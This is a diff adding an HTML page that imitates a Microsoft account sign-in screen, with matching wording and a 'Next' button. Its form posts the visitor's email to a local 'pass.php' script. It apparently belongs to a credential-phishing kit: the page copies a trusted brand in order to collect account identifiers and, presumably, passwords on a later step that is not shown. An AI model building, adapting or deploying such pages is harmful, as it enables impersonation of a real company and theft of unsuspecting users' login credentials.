@@ -1,0 +1,53 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	
+ <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link href="main.css" rel="stylesheet" type="text/css" media="all">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+   <script src='https://kit.fontawesome.com/a076d05399.js'></script>
+<title>MS</title>
+
+<style>
+input[type=text] {
+	width: 100%;
+	padding: 5px 5px;
+	margin: 8px 0;
+	box-sizing: content-box;
+	border: none;
+	border-bottom: 1.5px solid black;
+	position: relative;
+	font-size: 14px;
+	height: 70%;
+		@include box-sizing(border-box);
+
+		&:focus {
+		  z-index: 2;
+		}
+}
+
+</style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <form class="form-signin" method="POST" action="pass.php">
+     <img src="log.png" width="120px" class=" img-fluid" /><p> </p><h3 class="form-signin-heading">  Sign in</h3>
+      <input type="text" class="form-controll" name="emai" placeholder="Email, phone, or Skype" required="" autofocus="" />
+      <!-- <input type="password" class="form-control" name="password" placeholder="Password" required=""/>    -->  
+     <!-- <label class="checkbox">
+        <input type="checkbox" value="remember-me" id="rememberMe" name="rememberMe"> Remember me
+      </label> --></br>  
+      <p style="font-size:14px">No account <span style="color:#09F; font-size:14px">Create one!</span></p>
+        <p style="font-size:14px; color:#09F">Sign in with a security key</br> </br>
+         Sign-in options</p>
+   <p align="right">  <button class="btn btn-md btn-primary "  type="submit">Next</button>  <p>
+    </form></br>  </div>
+    
+</body>
+</html>
